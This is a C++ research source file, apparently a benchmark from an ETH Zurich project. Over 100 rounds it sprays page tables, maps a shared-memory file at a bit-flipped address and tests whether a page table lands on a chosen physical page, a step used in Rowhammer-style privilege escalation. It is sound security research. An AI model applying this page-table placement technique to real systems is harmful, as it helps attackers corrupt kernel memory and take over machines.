/*
 * Copyright (C) 2025 Matej Bölcskei, ETH Zurich
 * Licensed under the GNU General Public License as published by the Free Software Foundation, version 3.
 * See LICENSE or <https://www.gnu.org/licenses/gpl-3.0.html> for details.
 *
 * SPDX-License-Identifier: GPL-3.0-only
 */

#include "rubench.hpp"
#include "rubicon.hpp"

#include <cstdio>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <unordered_set>
#include <random>
#include <stdexcept>
#include <cstdint>   // uintptr_t
#include <vector>
#include <algorithm>    // std::find
#include <iomanip>
#include <ios>
#include <iostream>

inline std::vector<void*>
random_pages_in_block(void* block,
                      std::size_t block_size,
                      std::size_t count) {
    if(block_size == 0)
        throw std::invalid_argument("block_size must be > 0");

    if(block_size % PAGE_SIZE != 0)
        throw std::invalid_argument(
            "block_size must be a multiple of PAGE_SIZE");

    const uintptr_t base = reinterpret_cast<uintptr_t>(block);
    if(!is_page_aligned(base))
        throw std::invalid_argument("block is not page-aligned");

    std::size_t pages = block_size / PAGE_SIZE;

    if(count == 0 || count > pages)
        throw std::invalid_argument("requested page count is out of range");

    // Build [0, 1, 2, …, pages-1], shuffle, and take the first ‘count’.
    static thread_local std::mt19937_64 rng{ std::random_device{}() };

    std::vector<std::size_t> indices(pages);
    std::iota(indices.begin(), indices.end(), 0);
    std::shuffle(indices.begin(), indices.end(), rng);

    std::vector<void*> out;
    out.reserve(count);
    for(std::size_t i = 0; i < count; ++i)
        out.emplace_back(
            reinterpret_cast<void*>(base + indices[i] * PAGE_SIZE));

    return out;
}

inline std::size_t
erase_pages(std::vector<void*>& pages, const std::vector<void*>& victims) {
    // Fast-path: nothing to do
    if(victims.empty())
        return 0;

    // Validate alignment of every victim
    for(void* p : victims)
        if(!is_page_aligned(reinterpret_cast<uintptr_t>(p)))
            throw std::invalid_argument(
                "erase_pages: address is not page-aligned");

    // Put victims in a hash set for O(1) look-ups
    std::unordered_set<void*> kill(victims.begin(), victims.end());

    // Stable erase-remove idiom
    auto new_end = std::remove_if(pages.begin(), pages.end(),
                                  [&kill](void* p) { return kill.count(p); });

    std::size_t erased = std::distance(new_end, pages.end());
    pages.erase(new_end, pages.end());
    return erased;
}

void* flip_bit(void* addr, unsigned pos) {
    auto v = reinterpret_cast<uintptr_t>(addr);
    v ^= (1ULL << pos);
    return reinterpret_cast<void*>(v);
}

inline void print_ptr_hex(const char* label, void* ptr) {
    std::ios old_state(nullptr);
    old_state.copyfmt(std::cout); // save caller’s formatting

    std::cout << label << ": 0x"
        << std::hex << std::setw(sizeof(uintptr_t) * 2)
        << std::setfill('0')
        << reinterpret_cast<uintptr_t>(ptr)
        << '\n';

    std::cout.copyfmt(old_state); // restore formatting
}

int main() {
    rubench_open();

    void* page_block_base = (void*)0x100000000UL;
    void* spray_base = (void*)0x200000000UL;
    constexpr uint64_t spray_pt_count = 65000UL;
    auto spray = strided_addresses(spray_base, spray_pt_count,
                                   kX86_64PageTableSpan);

    int num_rounds       = 100;
    long long total_time = 0;
    int num_fails        = 0;

    for(int round = 0; round < num_rounds; round++) {
        printf("Round %d\n", round);
        std::cout << "spray size : " << spray.size() << '\n'
            << "last addr  : 0x"
            << std::hex << std::uppercase
            << reinterpret_cast<std::uintptr_t>(spray.back())
            << std::dec << '\n';

        page_block_base   = get_4mb_block(page_block_base);
        auto random_pages = random_pages_in_block(
            page_block_base, 2 * kPageBlockSize, 100);
        void* pt_target = random_pages[0];
        mlock((void*)(unsigned long)pt_target, PAGE_SIZE);
        unsigned long target_phys = rubench_va_to_pa(pt_target);

        void* file_target = flip_bit(pt_target, 17);
        random_pages[1]   = file_target;

        print_ptr_hex("pt_target", pt_target);
        print_ptr_hex("file_target", file_target);

        const char* buf = "ffffffffffffffff";
        auto fd = open("/dev/shm", O_TMPFILE | O_RDWR, S_IRUSR | S_IWUSR);
        munmap(file_target, PAGE_SIZE);
        write(fd, buf, 8);
        auto fd_ptr = mmap(file_target, PAGE_SIZE, PROT_READ | PROT_WRITE,
                           MAP_SHARED | MAP_POPULATE, fd, 0);
        mlock(fd_ptr, PAGE_SIZE);

        auto addr       = (void*)(spray_base + kPageBlockSize);
        auto bait_pages = strided_addresses(page_block_base, 1ULL << 10,
                                            PAGE_SIZE);
        erase_pages(bait_pages, random_pages);
        pt_install(bait_pages, pt_target, addr, spray, fd);

        unsigned long value = rubench_read_phys(target_phys);
        auto file_phys      = rubench_va_to_pa(fd_ptr);

        printf("Pageblock physical address: %lx\n", target_phys);
        printf("File physical address: %lx\n", file_phys);
        printf("Value read from target: %lx\n", value);
        auto success = (value & 0xFFFFFFFFF000) == file_phys;

        if(success) {
            printf("PASS\n");
        } else {
            printf("FAIL\n");
        }

        close(fd);
        munlock(fd_ptr, PAGE_SIZE);
        munmap(fd_ptr, PAGE_SIZE);

        munmap(addr, PAGE_SIZE);
        munmap(page_block_base, kPageBlockSize);
    }

    printf("Number of failed tests: %d\n", num_fails);
    printf("Average time taken: %lld ns\n",
           total_time / (num_rounds - num_fails));

    rubench_close();
    return 0;
}
